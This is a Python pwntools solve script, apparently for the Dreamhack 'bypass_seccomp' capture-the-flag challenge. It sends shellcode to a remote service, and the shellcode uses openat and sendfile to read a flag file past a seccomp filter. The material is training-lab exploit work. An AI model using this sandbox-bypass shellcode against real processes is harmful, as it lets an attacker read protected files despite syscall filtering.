#!/usr/bin/env python3

from pwn import *

exe = ELF("./bypass_seccomp_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 15019)

    return r


def main():
    r = conn()

    shellcode = shellcraft.openat(0, "/home/bypass_seccomp/flag")
    shellcode += shellcraft.sendfile(1, "rax", 0, 0xffff)
    shellcode += shellcraft.exit(0)
    
    r.send(asm(shellcode))
    
    print(r.recvall())

    r.interactive()


if __name__ == "__main__":
    main()
